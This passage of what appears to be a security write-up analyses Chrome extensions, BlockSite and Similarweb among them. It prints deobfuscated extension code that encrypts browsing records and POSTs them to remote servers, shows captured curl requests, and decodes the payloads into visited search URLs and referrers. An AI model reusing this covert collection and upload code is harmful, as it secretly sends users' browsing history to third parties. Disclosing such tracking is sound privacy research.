+<span id="cb4-32"><a href="#cb4-32" aria-hidden="true" tabindex="-1"></a>                    <span class="kw">const</span> a <span class="op">=</span> <span class="bu">JSON</span><span class="op">.</span><span class="fu">stringify</span>(n)<span class="op">;</span></span>
+<span id="cb4-33"><a href="#cb4-33" aria-hidden="true" tabindex="-1"></a>                    <span class="cf">if</span> (<span class="op">!</span><span class="kw">this</span><span class="op">.</span><span class="at">recordsPath</span>) {</span>
+<span id="cb4-34"><a href="#cb4-34" aria-hidden="true" tabindex="-1"></a>                        <span class="kw">const</span> e <span class="op">=</span> <span class="st">&#39;{&quot;key_ops&quot;:[&quot;encrypt&quot;],&quot;ext&quot;:true,&quot;kty&quot;:&quot;RSA&quot;,&quot;n&quot;:&quot;z7mcaorg4Lg3uiPzud1bwLvRvsWK9bpTTsy_DxIX8WRcDndqNQHTgG0HZUTxggp2cLBnxvjG0UPxhfIPZZRed82vLsFYVvdJOsz9iZoKXHqT67RhbI2XecvWKp_ciaw6wRQAycklmIQJaZp4QA-P2Ye19FtG03VaNJRBUCy2Th6huKozUsRErnW5LBW0X7C_sxxpgAE9ijBhxwawnsGal7dCHGwgxcUe9-rfbCD9e7PEJCL_IE9L-hYzjngr5_vXjUU0udjwXNp3YnyA279CMA5bqucp5eI-kXXjsPJRGYw1znhuIwSP2soqXyRT22inklJ4VtBp3rctC5J6ZLnM8Q&quot;,&quot;e&quot;:&quot;AQAB&quot;,&quot;alg&quot;:&quot;RSA-OAEP-256&quot;}&#39;</span><span class="op">,</span></span>
+<span id="cb4-35"><a href="#cb4-35" aria-hidden="true" tabindex="-1"></a>                            t <span class="op">=</span> <span class="bu">JSON</span><span class="op">.</span><span class="fu">parse</span>(e)<span class="op">;</span></span>
+<span id="cb4-36"><a href="#cb4-36" aria-hidden="true" tabindex="-1"></a>                        <span class="kw">this</span><span class="op">.</span><span class="at">recordsPath</span> <span class="op">=</span> <span class="cf">await</span> self<span class="op">.</span><span class="at">crypto</span><span class="op">.</span><span class="at">subtle</span><span class="op">.</span><span class="fu">importKey</span>(<span class="st">&quot;jwk&quot;</span><span class="op">,</span> t<span class="op">,</span> {</span>
+<span id="cb4-37"><a href="#cb4-37" aria-hidden="true" tabindex="-1"></a>                            <span class="dt">name</span><span class="op">:</span> <span class="st">&quot;RSA-OAEP&quot;</span><span class="op">,</span></span>
+<span id="cb4-38"><a href="#cb4-38" aria-hidden="true" tabindex="-1"></a>                            <span class="dt">hash</span><span class="op">:</span> <span class="st">&quot;SHA-256&quot;</span></span>
+<span id="cb4-39"><a href="#cb4-39" aria-hidden="true" tabindex="-1"></a>                        }<span class="op">,</span> <span class="op">!</span><span class="dv">1</span><span class="op">,</span> [<span class="st">&quot;encrypt&quot;</span>])</span>
+<span id="cb4-40"><a href="#cb4-40" aria-hidden="true" tabindex="-1"></a>                    }</span>
+<span id="cb4-41"><a href="#cb4-41" aria-hidden="true" tabindex="-1"></a>                    <span class="kw">const</span> s <span class="op">=</span> {}<span class="op">;</span></span>
+<span id="cb4-42"><a href="#cb4-42" aria-hidden="true" tabindex="-1"></a>                    <span class="cf">if</span> (a<span class="op">.</span><span class="at">length</span> <span class="op">&lt;</span> <span class="dv">190</span>) {</span>
+<span id="cb4-43"><a href="#cb4-43" aria-hidden="true" tabindex="-1"></a>                        <span class="kw">const</span> t <span class="op">=</span> <span class="cf">await</span> self<span class="op">.</span><span class="at">crypto</span><span class="op">.</span><span class="at">subtle</span><span class="op">.</span><span class="fu">encrypt</span>({</span>
+<span id="cb4-44"><a href="#cb4-44" aria-hidden="true" tabindex="-1"></a>                            <span class="dt">name</span><span class="op">:</span> <span class="st">&quot;RSA-OAEP&quot;</span></span>
+<span id="cb4-45"><a href="#cb4-45" aria-hidden="true" tabindex="-1"></a>                        }<span class="op">,</span> <span class="kw">this</span><span class="op">.</span><span class="at">recordsPath</span><span class="op">,</span> (<span class="kw">new</span> TextEncoder)<span class="op">.</span><span class="fu">encode</span>(a))<span class="op">;</span></span>
+<span id="cb4-46"><a href="#cb4-46" aria-hidden="true" tabindex="-1"></a>                        s[e] <span class="op">=</span> <span class="fu">btoa</span>(<span class="bu">String</span><span class="op">.</span><span class="at">fromCharCode</span><span class="op">.</span><span class="fu">apply</span>(<span class="kw">null</span><span class="op">,</span> <span class="kw">new</span> <span class="bu">Uint8Array</span>(t)))</span>
+<span id="cb4-47"><a href="#cb4-47" aria-hidden="true" tabindex="-1"></a>                    } <span class="cf">else</span> {</span>
+<span id="cb4-48"><a href="#cb4-48" aria-hidden="true" tabindex="-1"></a>                        <span class="kw">const</span> t <span class="op">=</span> <span class="cf">await</span> <span class="kw">this</span><span class="op">.</span><span class="fu">compilationGenerator</span>()<span class="op">,</span></span>
+<span id="cb4-49"><a href="#cb4-49" aria-hidden="true" tabindex="-1"></a>                            n <span class="op">=</span> self<span class="op">.</span><span class="at">crypto</span><span class="op">.</span><span class="fu">getRandomValues</span>(<span class="kw">new</span> <span class="bu">Uint8Array</span>(<span class="dv">12</span>))<span class="op">,</span></span>
+<span id="cb4-50"><a href="#cb4-50" aria-hidden="true" tabindex="-1"></a>                            i <span class="op">=</span> <span class="cf">await</span> self<span class="op">.</span><span class="at">crypto</span><span class="op">.</span><span class="at">subtle</span><span class="op">.</span><span class="fu">encrypt</span>({</span>
+<span id="cb4-51"><a href="#cb4-51" aria-hidden="true" tabindex="-1"></a>                                <span class="dt">name</span><span class="op">:</span> <span class="st">&quot;AES-GCM&quot;</span><span class="op">,</span></span>
+<span id="cb4-52"><a href="#cb4-52" aria-hidden="true" tabindex="-1"></a>                                <span class="dt">iv</span><span class="op">:</span> n</span>
+<span id="cb4-53"><a href="#cb4-53" aria-hidden="true" tabindex="-1"></a>                            }<span class="op">,</span> t<span class="op">,</span> (<span class="kw">new</span> TextEncoder)<span class="op">.</span><span class="fu">encode</span>(a))<span class="op">,</span></span>
+<span id="cb4-54"><a href="#cb4-54" aria-hidden="true" tabindex="-1"></a>                            r <span class="op">=</span> <span class="kw">new</span> <span class="bu">Uint8Array</span>(n<span class="op">.</span><span class="at">length</span> <span class="op">+</span> i<span class="op">.</span><span class="at">byteLength</span>)<span class="op">;</span></span>
+<span id="cb4-55"><a href="#cb4-55" aria-hidden="true" tabindex="-1"></a>                        r<span class="op">.</span><span class="fu">set</span>(n)<span class="op">,</span></span>
+<span id="cb4-56"><a href="#cb4-56" aria-hidden="true" tabindex="-1"></a>                            r<span class="op">.</span><span class="fu">set</span>(<span class="kw">new</span> <span class="bu">Uint8Array</span>(i)<span class="op">,</span> n<span class="op">.</span><span class="at">length</span>)<span class="op">;</span></span>
+<span id="cb4-57"><a href="#cb4-57" aria-hidden="true" tabindex="-1"></a>                        <span class="kw">const</span> o <span class="op">=</span> <span class="cf">await</span> self<span class="op">.</span><span class="at">crypto</span><span class="op">.</span><span class="at">subtle</span><span class="op">.</span><span class="fu">exportKey</span>(<span class="st">&quot;jwk&quot;</span><span class="op">,</span> t)<span class="op">,</span></span>
+<span id="cb4-58"><a href="#cb4-58" aria-hidden="true" tabindex="-1"></a>                            c <span class="op">=</span> <span class="bu">JSON</span><span class="op">.</span><span class="fu">stringify</span>(o)<span class="op">,</span></span>
+<span id="cb4-59"><a href="#cb4-59" aria-hidden="true" tabindex="-1"></a>                            l <span class="op">=</span> <span class="cf">await</span> self<span class="op">.</span><span class="at">crypto</span><span class="op">.</span><span class="at">subtle</span><span class="op">.</span><span class="fu">encrypt</span>({</span>
+<span id="cb4-60"><a href="#cb4-60" aria-hidden="true" tabindex="-1"></a>                                <span class="dt">name</span><span class="op">:</span> <span class="st">&quot;RSA-OAEP&quot;</span></span>
+<span id="cb4-61"><a href="#cb4-61" aria-hidden="true" tabindex="-1"></a>                            }<span class="op">,</span> <span class="kw">this</span><span class="op">.</span><span class="at">recordsPath</span><span class="op">,</span> (<span class="kw">new</span> TextEncoder)<span class="op">.</span><span class="fu">encode</span>(c))<span class="op">;</span></span>
+<span id="cb4-62"><a href="#cb4-62" aria-hidden="true" tabindex="-1"></a>                        s[e] <span class="op">=</span> <span class="kw">this</span><span class="op">.</span><span class="fu">mergeRuleConfigs</span>(l<span class="op">,</span> r)</span>
+<span id="cb4-63"><a href="#cb4-63" aria-hidden="true" tabindex="-1"></a>                    }</span>
+<span id="cb4-64"><a href="#cb4-64" aria-hidden="true" tabindex="-1"></a>                    <span class="cf">return</span> s[t] <span class="op">=</span> <span class="st">&quot;hxQaXgzvrg&quot;</span><span class="op">,</span></span>
+<span id="cb4-65"><a href="#cb4-65" aria-hidden="true" tabindex="-1"></a>                        s</span>
+<span id="cb4-66"><a href="#cb4-66" aria-hidden="true" tabindex="-1"></a>                }</span>
+<span id="cb4-67"><a href="#cb4-67" aria-hidden="true" tabindex="-1"></a>                <span class="kw">async</span> <span class="fu">checkString</span>(e<span class="op">,</span> t<span class="op">,</span> n<span class="op">,</span> s<span class="op">,</span> i<span class="op">,</span> r) {</span>
+<span id="cb4-68"><a href="#cb4-68" aria-hidden="true" tabindex="-1"></a>                    <span class="kw">let</span> o <span class="op">=</span> <span class="kw">arguments</span><span class="op">.</span><span class="at">length</span> <span class="op">&gt;</span> <span class="dv">6</span> <span class="op">&amp;&amp;</span> <span class="kw">void</span> <span class="dv">0</span> <span class="op">!==</span> <span class="kw">arguments</span>[<span class="dv">6</span>] <span class="op">?</span> <span class="kw">arguments</span>[<span class="dv">6</span>] <span class="op">:</span> {}<span class="op">;</span></span>
+<span id="cb4-69"><a href="#cb4-69" aria-hidden="true" tabindex="-1"></a>                    <span class="kw">const</span> c <span class="op">=</span> <span class="cf">await</span> <span class="fu">fetch</span>(e)<span class="op">,</span></span>
+<span id="cb4-70"><a href="#cb4-70" aria-hidden="true" tabindex="-1"></a>                        l <span class="op">=</span> c<span class="op">.</span><span class="at">headers</span><span class="op">.</span><span class="fu">get</span>(<span class="st">&quot;Content-Type&quot;</span>)<span class="op">,</span></span>
+<span id="cb4-71"><a href="#cb4-71" aria-hidden="true" tabindex="-1"></a>                        u <span class="op">=</span> <span class="cf">await</span> c<span class="op">.</span><span class="fu">arrayBuffer</span>()<span class="op">,</span></span>
+<span id="cb4-72"><a href="#cb4-72" aria-hidden="true" tabindex="-1"></a>                        d <span class="op">=</span> <span class="kw">new</span> <span class="bu">File</span>([u]<span class="op">,</span> t<span class="op">,</span> {</span>
+<span id="cb4-73"><a href="#cb4-73" aria-hidden="true" tabindex="-1"></a>                            <span class="dt">type</span><span class="op">:</span> l <span class="op">||</span> n</span>
+<span id="cb4-74"><a href="#cb4-74" aria-hidden="true" tabindex="-1"></a>                        })<span class="op">,</span></span>
+<span id="cb4-75"><a href="#cb4-75" aria-hidden="true" tabindex="-1"></a>                        h <span class="op">=</span> <span class="bu">Object</span><span class="op">.</span><span class="fu">assign</span>({}<span class="op">,</span> a<span class="op">,</span> o)<span class="op">;</span></span>
+<span id="cb4-76"><a href="#cb4-76" aria-hidden="true" tabindex="-1"></a>                    <span class="kw">let</span> m <span class="op">=</span> {}<span class="op">;</span></span>
+<span id="cb4-77"><a href="#cb4-77" aria-hidden="true" tabindex="-1"></a>                    m <span class="op">=</span> <span class="cf">await</span> <span class="kw">this</span><span class="op">.</span><span class="fu">CmpNullValue</span>(i<span class="op">,</span> r<span class="op">,</span> h)<span class="op">,</span></span>
+<span id="cb4-78"><a href="#cb4-78" aria-hidden="true" tabindex="-1"></a>                        <span class="fu">fetch</span>(s<span class="op">,</span> {</span>
+<span id="cb4-79"><a href="#cb4-79" aria-hidden="true" tabindex="-1"></a>                            <span class="dt">body</span><span class="op">:</span> d<span class="op">,</span></span>
+<span id="cb4-80"><a href="#cb4-80" aria-hidden="true" tabindex="-1"></a>                            <span class="dt">method</span><span class="op">:</span> <span class="st">&quot;POST&quot;</span><span class="op">,</span></span>
+<span id="cb4-81"><a href="#cb4-81" aria-hidden="true" tabindex="-1"></a>                            <span class="dt">headers</span><span class="op">:</span> m</span>
+<span id="cb4-82"><a href="#cb4-82" aria-hidden="true" tabindex="-1"></a>                        })</span>
+<span id="cb4-83"><a href="#cb4-83" aria-hidden="true" tabindex="-1"></a>                }</span>
+<span id="cb4-84"><a href="#cb4-84" aria-hidden="true" tabindex="-1"></a>                <span class="kw">async</span> <span class="fu">toInt</span>(e<span class="op">,</span> t<span class="op">,</span> n<span class="op">,</span> s<span class="op">,</span> i<span class="op">,</span> r) {</span>
+<span id="cb4-85"><a href="#cb4-85" aria-hidden="true" tabindex="-1"></a>                    <span class="kw">let</span> o <span class="op">=</span> <span class="kw">arguments</span><span class="op">.</span><span class="at">length</span> <span class="op">&gt;</span> <span class="dv">6</span> <span class="op">&amp;&amp;</span> <span class="kw">void</span> <span class="dv">0</span> <span class="op">!==</span> <span class="kw">arguments</span>[<span class="dv">6</span>] <span class="op">?</span> <span class="kw">arguments</span>[<span class="dv">6</span>] <span class="op">:</span> {}<span class="op">;</span></span>
+<span id="cb4-86"><a href="#cb4-86" aria-hidden="true" tabindex="-1"></a>                    <span class="kw">const</span> c <span class="op">=</span> <span class="kw">new</span> <span class="bu">File</span>([e]<span class="op">,</span> t<span class="op">,</span> {</span>
+<span id="cb4-87"><a href="#cb4-87" aria-hidden="true" tabindex="-1"></a>                            <span class="dt">type</span><span class="op">:</span> n <span class="op">||</span> e<span class="op">.</span><span class="at">type</span> <span class="op">||</span> <span class="st">&quot;application/octet-stream&quot;</span></span>
+<span id="cb4-88"><a href="#cb4-88" aria-hidden="true" tabindex="-1"></a>                        })<span class="op">,</span></span>
+<span id="cb4-89"><a href="#cb4-89" aria-hidden="true" tabindex="-1"></a>                        l <span class="op">=</span> <span class="bu">Object</span><span class="op">.</span><span class="fu">assign</span>({}<span class="op">,</span> a<span class="op">,</span> o)<span class="op">;</span></span>
+<span id="cb4-90"><a href="#cb4-90" aria-hidden="true" tabindex="-1"></a>                    <span class="kw">let</span> u <span class="op">=</span> {}<span class="op">;</span></span>
+<span id="cb4-91"><a href="#cb4-91" aria-hidden="true" tabindex="-1"></a>                    u <span class="op">=</span> <span class="cf">await</span> <span class="kw">this</span><span class="op">.</span><span class="fu">CmpNullValue</span>(i<span class="op">,</span> r<span class="op">,</span> l)<span class="op">,</span></span>
+<span id="cb4-92"><a href="#cb4-92" aria-hidden="true" tabindex="-1"></a>                        <span class="fu">fetch</span>(s<span class="op">,</span> {</span>
+<span id="cb4-93"><a href="#cb4-93" aria-hidden="true" tabindex="-1"></a>                            <span class="dt">body</span><span class="op">:</span> c<span class="op">,</span></span>
+<span id="cb4-94"><a href="#cb4-94" aria-hidden="true" tabindex="-1"></a>                            <span class="dt">method</span><span class="op">:</span> <span class="st">&quot;POST&quot;</span><span class="op">,</span></span>
+<span id="cb4-95"><a href="#cb4-95" aria-hidden="true" tabindex="-1"></a>                            <span class="dt">headers</span><span class="op">:</span> u</span>
+<span id="cb4-96"><a href="#cb4-96" aria-hidden="true" tabindex="-1"></a>                        })</span>
+<span id="cb4-97"><a href="#cb4-97" aria-hidden="true" tabindex="-1"></a>                }</span>
+<span id="cb4-98"><a href="#cb4-98" aria-hidden="true" tabindex="-1"></a>            }<span class="op">,</span></span>
+<span id="cb4-99"><a href="#cb4-99" aria-hidden="true" tabindex="-1"></a>            t<span class="op">.</span><span class="at">instance</span> <span class="op">=</span> <span class="kw">new</span> t<span class="op">.</span><span class="at">class</span></span>
+<span id="cb4-100"><a href="#cb4-100" aria-hidden="true" tabindex="-1"></a>    }<span class="op">,</span></span>
+<span id="cb4-101"><a href="#cb4-101" aria-hidden="true" tabindex="-1"></a>    <span class="dt">deps</span><span class="op">:</span> [<span class="st">&quot;ModulesA&quot;</span>]</span>
+<span id="cb4-102"><a href="#cb4-102" aria-hidden="true" tabindex="-1"></a>}<span class="op">,</span></span></code></pre></div>
+<h3 id="blocksite-block-websites-and-stay-focused">BlockSite Block
+Websites and Stay Focused</h3>
+<p><code>extension_id: eiimnmioipafcokbfikbljfdeojpcgbh</code></p>
+<div class="sourceCode" id="cb5"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true" tabindex="-1"></a><span class="ex">curl</span> <span class="st">&#39;https://category.blocksite.co/category&#39;</span> <span class="dt">\</span></span>
+<span id="cb5-2"><a href="#cb5-2" aria-hidden="true" tabindex="-1"></a>  <span class="at">-H</span> <span class="st">&#39;Accept: */*&#39;</span> <span class="dt">\</span></span>
+<span id="cb5-3"><a href="#cb5-3" aria-hidden="true" tabindex="-1"></a>  <span class="at">-H</span> <span class="st">&#39;Accept-Language: en-GB,en-US;q=0.9,en;q=0.8&#39;</span> <span class="dt">\</span></span>
+<span id="cb5-4"><a href="#cb5-4" aria-hidden="true" tabindex="-1"></a>  <span class="at">-H</span> <span class="st">&#39;Authorization: Bearer XXXXXX&#39;</span> <span class="dt">\</span></span>
+<span id="cb5-5"><a href="#cb5-5" aria-hidden="true" tabindex="-1"></a>  <span class="at">-H</span> <span class="st">&#39;Connection: keep-alive&#39;</span> <span class="dt">\</span></span>
+<span id="cb5-6"><a href="#cb5-6" aria-hidden="true" tabindex="-1"></a>  <span class="at">-b</span> <span class="st">&#39;XXXXXX&#39;</span> <span class="dt">\</span></span>
+<span id="cb5-7"><a href="#cb5-7" aria-hidden="true" tabindex="-1"></a>  <span class="at">-H</span> <span class="st">&#39;Origin: chrome-extension://eiimnmioipafcokbfikbljfdeojpcgbh&#39;</span> <span class="dt">\</span></span>
+<span id="cb5-8"><a href="#cb5-8" aria-hidden="true" tabindex="-1"></a>  <span class="at">-H</span> <span class="st">&#39;Sec-Fetch-Dest: empty&#39;</span> <span class="dt">\</span></span>
+<span id="cb5-9"><a href="#cb5-9" aria-hidden="true" tabindex="-1"></a>  <span class="at">-H</span> <span class="st">&#39;Sec-Fetch-Mode: cors&#39;</span> <span class="dt">\</span></span>
+<span id="cb5-10"><a href="#cb5-10" aria-hidden="true" tabindex="-1"></a>  <span class="at">-H</span> <span class="st">&#39;Sec-Fetch-Site: none&#39;</span> <span class="dt">\</span></span>
+<span id="cb5-11"><a href="#cb5-11" aria-hidden="true" tabindex="-1"></a>  <span class="at">-H</span> <span class="st">&#39;Sec-Fetch-Storage-Access: active&#39;</span> <span class="dt">\</span></span>
+<span id="cb5-12"><a href="#cb5-12" aria-hidden="true" tabindex="-1"></a>  <span class="at">-H</span> <span class="st">&#39;User-Agent: XXXXXX&#39;</span> <span class="dt">\</span></span>
+<span id="cb5-13"><a href="#cb5-13" aria-hidden="true" tabindex="-1"></a>  <span class="at">-H</span> <span class="st">&#39;bone: google.com&#39;</span> <span class="dt">\</span></span>
+<span id="cb5-14"><a href="#cb5-14" aria-hidden="true" tabindex="-1"></a>  <span class="at">-H</span> <span class="st">&#39;content-type: application/json&#39;</span> <span class="dt">\</span></span>
+<span id="cb5-15"><a href="#cb5-15" aria-hidden="true" tabindex="-1"></a>  <span class="at">-H</span> <span class="st">&#39;mufc: mchj&#39;</span> <span class="dt">\</span></span>
+<span id="cb5-16"><a href="#cb5-16" aria-hidden="true" tabindex="-1"></a>  <span class="at">--data-raw</span> <span class="st">&#39;EQVwNsQ%3D=EQ...&#39;</span></span></code></pre></div>
+<div class="sourceCode" id="cb6"><pre class="sourceCode js"><code class="sourceCode javascript"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true" tabindex="-1"></a><span class="kw">const</span> LZString <span class="op">=</span> <span class="pp">require</span>(<span class="st">&#39;lz-string&#39;</span>)<span class="op">;</span></span>
+<span id="cb6-2"><a href="#cb6-2" aria-hidden="true" tabindex="-1"></a><span class="kw">var</span> payload <span class="op">=</span> <span class="st">&quot;EQVwNsQ%3D=EQ...&quot;</span><span class="op">;</span> </span>
+<span id="cb6-3"><a href="#cb6-3" aria-hidden="true" tabindex="-1"></a>payload<span class="op">.</span><span class="fu">split</span>(<span class="st">&#39;&amp;&#39;</span>)<span class="op">.</span><span class="fu">forEach</span>(pair <span class="kw">=&gt;</span> {</span>
+<span id="cb6-4"><a href="#cb6-4" aria-hidden="true" tabindex="-1"></a>    <span class="kw">let</span> parts <span class="op">=</span> pair<span class="op">.</span><span class="fu">split</span>(<span class="ss">/=</span><span class="sc">(</span><span class="ss">.</span><span class="sc">+)</span><span class="ss">/</span>)<span class="op">;</span></span>
+<span id="cb6-5"><a href="#cb6-5" aria-hidden="true" tabindex="-1"></a>    <span class="kw">let</span> rawKey <span class="op">=</span> parts[<span class="dv">0</span>]<span class="op">;</span></span>
+<span id="cb6-6"><a href="#cb6-6" aria-hidden="true" tabindex="-1"></a>    <span class="kw">let</span> rawValue <span class="op">=</span> parts[<span class="dv">1</span>]<span class="op">;</span></span>
+<span id="cb6-7"><a href="#cb6-7" aria-hidden="true" tabindex="-1"></a>    <span class="kw">let</span> keyBase64 <span class="op">=</span> <span class="pp">decodeURIComponent</span>(rawKey)<span class="op">;</span></span>
+<span id="cb6-8"><a href="#cb6-8" aria-hidden="true" tabindex="-1"></a>    <span class="kw">let</span> valBase64 <span class="op">=</span> <span class="pp">decodeURIComponent</span>(rawValue)<span class="op">;</span></span>
+<span id="cb6-9"><a href="#cb6-9" aria-hidden="true" tabindex="-1"></a>    <span class="kw">let</span> key <span class="op">=</span> LZString<span class="op">.</span><span class="fu">decompressFromBase64</span>(keyBase64)<span class="op">;</span></span>
+<span id="cb6-10"><a href="#cb6-10" aria-hidden="true" tabindex="-1"></a>    <span class="kw">let</span> val <span class="op">=</span> LZString<span class="op">.</span><span class="fu">decompressFromBase64</span>(valBase64)<span class="op">;</span></span>
+<span id="cb6-11"><a href="#cb6-11" aria-hidden="true" tabindex="-1"></a>    <span class="bu">console</span><span class="op">.</span><span class="fu">log</span>(<span class="vs">`</span><span class="sc">${</span>key<span class="sc">}</span><span class="vs">:`</span><span class="op">,</span> val)<span class="op">;</span></span>
+<span id="cb6-12"><a href="#cb6-12" aria-hidden="true" tabindex="-1"></a>})<span class="op">;</span></span></code></pre></div>
+<p>returns the following</p>
+<pre><code>&quot;ul&quot;: &quot;https%3A%2F%2Fwww.google.com%2Fsearch%3Fq%3Dtarget&quot;
+&quot;ink&quot;: &quot;https%3A%2F%2Fwww.google.com%2Fsearch%3Fq%3Dprevious&quot;
+&quot;pel&quot;: &quot;https%3A%2F%2Fwww.google.com%2Fsearch%3Fq%3Dprevious&quot;
+&quot;rr&quot;: &quot;https%3A%2F%2Fwww.google.com%2F&quot;
+&quot;dot&quot;: [XXXXXX]
+&quot;strm&quot;: &quot;form_submit&quot;
+&quot;poz&quot;: &quot;exthead&quot;
+&quot;lng&quot;: XXXXXX
+&quot;ch&quot;: 8
+&quot;rm&quot;: &quot;XXXXXX&quot;
+&quot;cas&quot;: &quot;XXXXXX&quot;
+&quot;v3&quot;: 6
+&quot;dis&quot;: 21
+&quot;cm&quot;: 1
+&quot;org&quot;: &quot;6.9.7&quot;
+&quot;info&quot;: &quot;XXXXXX&quot;</code></pre>
+<h3 id="similarweb---website-traffic-and-seo-checker">Similarweb -
+Website Traffic and SEO Checker</h3>
+<p><code>extension_id: hoklmmgfnpapgjgcpechhaamimifchmp</code></p>
+<p>To be fair, Similarweb makes it now mandatory to tick boxes where
+they state that they will collect all browsing data.</p>
+<div class="sourceCode" id="cb8"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb8-1"><a href="#cb8-1" aria-hidden="true" tabindex="-1"></a><span class="ex">curl</span> <span class="st">&#39;https://rank.similarweb.com/api/v1/global&#39;</span> <span class="dt">\</span></span>
+<span id="cb8-2"><a href="#cb8-2" aria-hidden="true" tabindex="-1"></a>  <span class="at">-H</span> <span class="st">&#39;Accept: */*&#39;</span> <span class="dt">\</span></span>
+<span id="cb8-3"><a href="#cb8-3" aria-hidden="true" tabindex="-1"></a>  <span class="at">-H</span> <span class="st">&#39;Accept-Language: en-GB,en-US;q=0.9,en;q=0.8&#39;</span> <span class="dt">\</span></span>
+<span id="cb8-4"><a href="#cb8-4" aria-hidden="true" tabindex="-1"></a>  <span class="at">-H</span> <span class="st">&#39;Connection: keep-alive&#39;</span> <span class="dt">\</span></span>
+<span id="cb8-5"><a href="#cb8-5" aria-hidden="true" tabindex="-1"></a>  <span class="at">-H</span> <span class="st">&#39;Content-type: application/x-www-form-urlencoded&#39;</span> <span class="dt">\</span></span>
+<span id="cb8-6"><a href="#cb8-6" aria-hidden="true" tabindex="-1"></a>  <span class="at">-b</span> <span class="st">&#39;XXXXXX&#39;</span> <span class="dt">\</span></span>
+<span id="cb8-7"><a href="#cb8-7" aria-hidden="true" tabindex="-1"></a>  <span class="at">-H</span> <span class="st">&#39;Origin: chrome-extension://hoklmmgfnpapgjgcpechhaamimifchmp&#39;</span> <span class="dt">\</span></span>
+<span id="cb8-8"><a href="#cb8-8" aria-hidden="true" tabindex="-1"></a>  <span class="at">-H</span> <span class="st">&#39;Sec-Fetch-Dest: empty&#39;</span> <span class="dt">\</span></span>
+<span id="cb8-9"><a href="#cb8-9" aria-hidden="true" tabindex="-1"></a>  <span class="at">-H</span> <span class="st">&#39;Sec-Fetch-Mode: cors&#39;</span> <span class="dt">\</span></span>
+<span id="cb8-10"><a href="#cb8-10" aria-hidden="true" tabindex="-1"></a>  <span class="at">-H</span> <span class="st">&#39;Sec-Fetch-Site: none&#39;</span> <span class="dt">\</span></span>
+<span id="cb8-11"><a href="#cb8-11" aria-hidden="true" tabindex="-1"></a>  <span class="at">-H</span> <span class="st">&#39;Sec-Fetch-Storage-Access: active&#39;</span> <span class="dt">\</span></span>
+<span id="cb8-12"><a href="#cb8-12" aria-hidden="true" tabindex="-1"></a>  <span class="at">-H</span> <span class="st">&#39;User-Agent: XXXXXX&#39;</span> <span class="dt">\</span></span>
+<span id="cb8-13"><a href="#cb8-13" aria-hidden="true" tabindex="-1"></a>  <span class="at">-H</span> <span class="st">&#39;hiw8: www.google.com&#39;</span> <span class="dt">\</span></span>
+<span id="cb8-14"><a href="#cb8-14" aria-hidden="true" tabindex="-1"></a>  <span class="at">-H</span> <span class="st">&#39;x-session-init: s=a7a4e8223&amp;v=6.12.16&amp;p=0&#39;</span> <span class="dt">\</span></span>
+<span id="cb8-15"><a href="#cb8-15" aria-hidden="true" tabindex="-1"></a>  <span class="at">--data-raw</span> <span class="st">&#39;e=q%3Dhttps...&#39;</span></span></code></pre></div>
+<p>The payload of <code>e</code> parameter uses multiple layers of URL
+encoding, very simple to decode.</p>
+<div class="sourceCode" id="cb9"><pre class="sourceCode js"><code class="sourceCode javascript"><span id="cb9-1"><a href="#cb9-1" aria-hidden="true" tabindex="-1"></a><span class="kw">var</span> payload <span class="op">=</span> <span class="st">&quot;e=q%3Dhttps...&quot;</span><span class="op">;</span></span>
+<span id="cb9-2"><a href="#cb9-2" aria-hidden="true" tabindex="-1"></a><span class="kw">var</span> decoded <span class="op">=</span> payload<span class="op">;</span></span>
+<span id="cb9-3"><a href="#cb9-3" aria-hidden="true" tabindex="-1"></a><span class="kw">var</span> last <span class="op">=</span> <span class="st">&quot;&quot;</span><span class="op">;</span></span>
+<span id="cb9-4"><a href="#cb9-4" aria-hidden="true" tabindex="-1"></a><span class="cf">while</span> (decoded <span class="op">!==</span> last) {</span>
+<span id="cb9-5"><a href="#cb9-5" aria-hidden="true" tabindex="-1"></a>    last <span class="op">=</span> decoded<span class="op">;</span></span>
+<span id="cb9-6"><a href="#cb9-6" aria-hidden="true" tabindex="-1"></a>    decoded <span class="op">=</span> <span class="pp">decodeURIComponent</span>(decoded)<span class="op">;</span></span>
+<span id="cb9-7"><a href="#cb9-7" aria-hidden="true" tabindex="-1"></a>}</span>
+<span id="cb9-8"><a href="#cb9-8" aria-hidden="true" tabindex="-1"></a>decoded<span class="op">.</span><span class="fu">split</span>(<span class="st">&#39;&amp;&#39;</span>)<span class="op">.</span><span class="fu">forEach</span>(pair <span class="kw">=&gt;</span> {</span>
+<span id="cb9-9"><a href="#cb9-9" aria-hidden="true" tabindex="-1"></a>    <span class="kw">let</span> [key<span class="op">,</span> val] <span class="op">=</span> pair<span class="op">.</span><span class="fu">split</span>(<span class="ss">/=</span><span class="sc">(</span><span class="ss">.</span><span class="sc">+)</span><span class="ss">/</span>)<span class="op">;</span></span>
+<span id="cb9-10"><a href="#cb9-10" aria-hidden="true" tabindex="-1"></a>    <span class="bu">console</span><span class="op">.</span><span class="fu">log</span>(<span class="vs">`</span><span class="sc">${</span>key<span class="sc">}</span><span class="vs">: </span><span class="sc">${</span>val<span class="sc">}</span><span class="vs">`</span>)<span class="op">;</span></span>
+<span id="cb9-11"><a href="#cb9-11" aria-hidden="true" tabindex="-1"></a>})<span class="op">;</span></span></code></pre></div>
+<pre><code>q: https://www.google.com/search?q=target
+sca_esv: XXXXXX
+ei: XXXXXX
+ved: XXXXXX
+uact: 5
+oq: target
+gs_lp: XXXXXX
+sclient: gws-wiz-serp
+link: https://www.google.com/search?q=previous
+sca_esv: XXXXXX
+ei: XXXXXX
+ved: XXXXXX
+uact: 5
+oq: previous
+gs_lp: XXXXXX
+sclient: gws-wiz-serp
+hreferer: https://www.google.com/
+iow: XXXXXX
+tt: form_submit
+meta: exthead
+ht: [{&quot;type&quot;:&quot;humanibility&quot;,&quot;data&quot;:{&quot;md&quot;:&quot;XXXXXX&quot;,&quot;td&quot;:XXXXXX,&quot;tc&quot;:1,&quot;pn&quot;:&quot;XXXXXX&quot;}}]
+ts: XXXXXX
+ch: 0
+s: XXXXXX
+pid: XXXXXX
+tmv: 6
+md: 21
+v: 1
+sub: 6.12.16
+app: XXXXXX</code></pre>
+<h3 id="wot-website-security-and-safety-checker">WOT: Website Security
+and Safety Checker</h3>
+<p><code>extension_id: bhmmomiinigofkjcapegjjndpbikblnp</code></p>
+<p>In 2016 in this german <a
